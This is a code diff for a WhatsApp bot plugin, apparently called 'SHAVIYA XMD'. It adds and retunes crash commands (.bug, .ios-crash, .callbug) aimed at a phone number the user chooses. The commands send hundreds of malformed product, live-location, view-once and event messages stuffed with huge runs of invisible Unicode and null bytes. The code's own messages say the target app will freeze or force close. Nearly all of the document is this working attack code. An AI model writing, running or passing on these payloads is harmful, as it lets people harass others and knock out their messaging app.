@@ -18,21 +18,20 @@ async function getImageBuffer(url) {
 
 function getTarget(args, from, reply, cmdName) {
     if (!args || !args[0]) {
-        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX [cycles]\nExample: .${cmdName} 94712345678 5`);
+        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
         return null;
     }
     return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
 }
 
-// ==================== .bug – PRODUCT + LIVE LOCATION (HEAVY UNICODE, FAST DELIVERY) ====================
-// Original working product message
+// ==================== .bug – 150 MESSAGES (75 PRODUCT + 75 LIVE LOCATION) ====================
 async function sendProduct(conn, target) {
     const imageMessage = {
         url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
         mimetype: "image/jpeg",
         fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
         fileLength: "93217",
-        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + " \u2060".repeat(90000),
+        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
         height: 1080,
         width: 1080,
         mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
@@ -54,7 +53,7 @@ async function sendProduct(conn, target) {
                         productImage: imageMessage,
                         productId: "449756950375071",
                         title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
-                        description: "FUCK you Biych",
+                        description: "MY Bad",
                         priceAmount1000: { low: 999, high: 0, unsigned: false },
                         url: "wa.me/status",
                         productImageCount: 9999999,
@@ -69,9 +68,8 @@ async function sendProduct(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// Live location with heavy Unicode (invisible characters + long text)
 async function sendLiveLocation(conn, target) {
-    const heavyUnicode = "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u2060".repeat(90000) + "\u2063".repeat(90000) + "ꦾ".repeat(90000);
+    const heavyUnicode = "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u2060".repeat(10000) + "\u2063".repeat(10000) + "ꦾ".repeat(5000);
     const msg = generateWAMessageFromContent(target, {
         liveLocationMessage: {
             degreesLatitude: 6.9271,
@@ -84,32 +82,26 @@ async function sendLiveLocation(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// .bug command – product + location combo, repeatable (cycles)
 cmd({
     pattern: "bug",
-    desc: "💀 ULTIMATE CRASH – 50 product + 50 live location per cycle (heavy unicode, double tick)",
+    desc: "💀 150 CRASH – 75 product + 75 live location (heavy unicode)",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, reply, args }) => {
     const target = getTarget(args, from, reply, "bug");
     if (!target) return;
-    let cycles = parseInt(args[1]);
-    if (isNaN(cycles) || cycles < 1) cycles = 1;
-    if (cycles > 100) cycles = 100; // safety limit (100 cycles = 10,000 messages)
-    await reply(`💀 *SHAVIYA XMD ULTIMATE CRASH* → ${target}\n_Sending ${cycles} cycle(s) (${cycles*100} messages: product + live location)..._`);
+    await reply(`💀 *SHAVIYA XMD 150 CRASH* → ${target}\n_Sending 75 product + 75 live location..._`);
     try {
-        for (let c = 0; c < cycles; c++) {
-            for (let i = 0; i < 50; i++) {
-                await sendProduct(conn, target);
-                await new Promise(r => setTimeout(r, 40));
-            }
-            for (let i = 0; i < 50; i++) {
-                await sendLiveLocation(conn, target);
-                await new Promise(r => setTimeout(r, 40));
-            }
+        for (let i = 0; i < 75; i++) {
+            await sendProduct(conn, target);
+            await new Promise(r => setTimeout(r, 40));
+        }
+        for (let i = 0; i < 75; i++) {
+            await sendLiveLocation(conn, target);
+            await new Promise(r => setTimeout(r, 40));
         }
         const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
-        const caption = `✅ ULTIMATE CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp flooded (${cycles*100} messages). Force close / black screen expected.*`;
+        const caption = `✅ 150 CRASH DELIVERED → ${target}\n⚠️ *Target flooded (150 msgs). Force close / black screen expected.*`;
         if (successImg) await conn.sendMessage(from, { image: successImg, caption });
         else await reply(caption);
     } catch (err) {
@@ -118,8 +110,7 @@ cmd({
     }
 });
 
-// ==================== iOS CRASH – ALL 7 ORIGINAL FUNCTIONS (FIXED) ====================
-// 1. NexusLightUiDelay
+// ==================== iOS CRASH – ALL 7 FUNCTIONS, 100 CYCLES (700 TOTAL) ====================
 async function nexusLightUiDelay(conn, target) {
     const generateMessage = {
         viewOnceMessage: {
@@ -169,7 +160,6 @@ async function nexusLightUiDelay(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// 2. IosInvisibleForce
 async function iosInvisibleForce(conn, target) {
     const msg = {
         locationMessage: {
@@ -192,7 +182,6 @@ async function iosInvisibleForce(conn, target) {
     await conn.relayMessage(target, msg, {});
 }
 
-// 3. DelayNative
 async function delayNative(conn, target) {
     const message = {
         viewOnceMessage: {
@@ -211,7 +200,6 @@ async function delayNative(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// 4. VerloadFcVisibleV1 (3 parts)
 async function verloadFcVisibleV1(conn, target) {
     const venomModsData = JSON.stringify({
         status: true, criador: "VenomMods", resultado: {
@@ -279,7 +267,6 @@ async function verloadFcVisibleV1(conn, target) {
     await conn.relayMessage(target, msg3, { participant: { jid: target } });
 }
 
-// 5. galaxy_invisible
 async function galaxyInvisible(conn, target) {
     const msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
@@ -310,7 +297,6 @@ async function galaxyInvisible(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// 6. CrashLoadIos
 async function crashLoadIos(conn, target) {
     const locationMsg = {
         locationMessage: {
@@ -332,7 +318,6 @@ async function crashLoadIos(conn, target) {
     await conn.relayMessage(target, locationMsg, { participant: { jid: target } });
 }
 
-// 7. DelayMention
 async function delayMention(conn, target) {
     const message = {
         viewOnceMessage: {
@@ -350,13 +335,13 @@ async function delayMention(conn, target) {
     await conn.relayMessage(target, msg.message, {});
 }
 
-// iOS combo – all 7 functions, repeatable
-async function iosComboCrash(conn, target, repeat = 1) {
+// iOS combo – 100 cycles of all 7 functions (700 total payloads)
+async function iosComboCrash(conn, target) {
     const modules = [
         nexusLightUiDelay, iosInvisibleForce, delayNative, verloadFcVisibleV1,
         galaxyInvisible, crashLoadIos, delayMention
     ];
-    for (let r = 0; r < repeat; r++) {
+    for (let cycle = 0; cycle < 100; cycle++) {
         for (const mod of modules) {
             try {
                 await mod(conn, target);
@@ -370,20 +355,69 @@ async function iosComboCrash(conn, target, repeat = 1) {
 
 cmd({
     pattern: "ios-crash",
-    desc: "🍏 iOS COMBO – all 7 original payloads, repeatable & invisible",
+    desc: "🍏 iOS 100 CYCLES – All 7 functions × 100 = 700 invisible payloads",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, reply, args }) => {
     const target = getTarget(args, from, reply, "ios-crash");
     if (!target) return;
-    let repeat = parseInt(args[1]);
-    if (isNaN(repeat) || repeat < 1) repeat = 1;
-    if (repeat > 20) repeat = 20;
-    await reply(`🍏 *SHAVIYA XMD iOS COMBO* → ${target}\n_Firing all 7 iOS modules, ${repeat} cycle(s) (total ${repeat*7} payloads)..._`);
+    await reply(`🍏 *SHAVIYA XMD iOS 100 CYCLES* → ${target}\n_Firing 7 iOS modules, 100 cycles each (700 total payloads)..._\n_This may take 2-3 minutes._`);
     try {
-        await iosComboCrash(conn, target, repeat);
+        await iosComboCrash(conn, target);
         const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
-        const caption = `✅ iOS COMBO DELIVERED → ${target}\n⚠️ *Target iOS WhatsApp will force close / freeze completely.*\n📊 *${repeat*7} invisible payloads sent.*`;
+        const caption = `✅ iOS 100 CYCLES DELIVERED → ${target}\n⚠️ *Target iOS WhatsApp will force close / freeze completely.*\n📊 *700 invisible payloads sent.*`;
+        if (successImg) await conn.sendMessage(from, { image: successImg, caption });
+        else await reply(caption);
+    } catch (err) {
+        console.error(err);
+        await reply(`❌ Failed: ${err.message}`);
+    }
+});
+
+// ==================== .callbug – FIXED PROTOCOL DATE EVENT CRASH ====================
+async function protocolDateCrash(conn, target) {
+    const msg = {
+        viewOnceMessage: {
+            message: {
+                messageContextInfo: {
+                    messageSecret: Buffer.alloc(32, 1)
+                },
+                eventMessage: {
+                    isCanceled: false,
+                    name: "ℓχρWs вυggєяѕ",
+                    description: "*͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚",
+                    location: {
+                        degreesLatitude: 1.1, 
+                        degreesLongitude: 1.1, 
+                        name: "90.0",
+                        address: "90.0"
+                    },
+                    extraGuestsAllowed: true,
+                    hasReminder: true,
+                    reminderOffsetSec: "3600",
+                    joinLink: "https://call.whatsapp.com/video/zBhda7MV8fFoffxSpf8DMg" + "\u0000".repeat(902000),
+                    startTime: "1770993000",
+                    endTime: null
+                }
+            }
+        }
+    };
+    await conn.relayMessage(target, msg, {});
+}
+
+cmd({
+    pattern: "callbug",
+    desc: "📞 CALL CRASH – Event message with 900KB null bytes (crashes call UI)",
+    category: "tools",
+    filename: __filename
+}, async (conn, mek, m, { from, reply, args }) => {
+    const target = getTarget(args, from, reply, "callbug");
+    if (!target) return;
+    await reply(`📞 *SHAVIYA XMD CALL CRASH* → ${target}\n_Sending malformed event message..._`);
+    try {
+        await protocolDateCrash(conn, target);
+        const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
+        const caption = `✅ CALL CRASH DELIVERED → ${target}\n⚠️ *Target WhatsApp call UI may freeze / crash.*`;
         if (successImg) await conn.sendMessage(from, { image: successImg, caption });
         else await reply(caption);
     } catch (err) {
@@ -399,7 +433,7 @@ cmd({
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, reply }) => {
-    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug [number] [cycles] – 💀 ULTIMATE COMBO (50 product + 50 live location / cycle)*\n*│ 📌 .ios-crash [number] [repeat] – 🍏 iOS COMBO (all 7 payloads, repeatable)*\n*╰──────────────●●►*\n> 💡 *Examples:*\n> .bug 94712345678 3   → 300 messages\n> .ios-crash 94712345678 2 → 14 invisible payloads\n> ⚠️ *Extreme power – use only on numbers you own.*`;
+    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug [number] – 💀 150 CRASH (75 product + 75 live location)*\n*│ 📌 .ios-crash [number] – 🍏 iOS 100 CYCLES (700 invisible payloads)*\n*│ 📌 .callbug [number] – 📞 CALL CRASH (event message with 900KB nulls)*\n*╰──────────────●●►*\n> 💡 *Examples:*\n> .bug 94712345678\n> .ios-crash 94712345678\n> .callbug 94712345678\n> ⚠️ *Extreme power – use only on numbers you own.*`;
     const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
     if (menuImg) {
         await conn.sendMessage(from, { image: menuImg, caption: menuText });
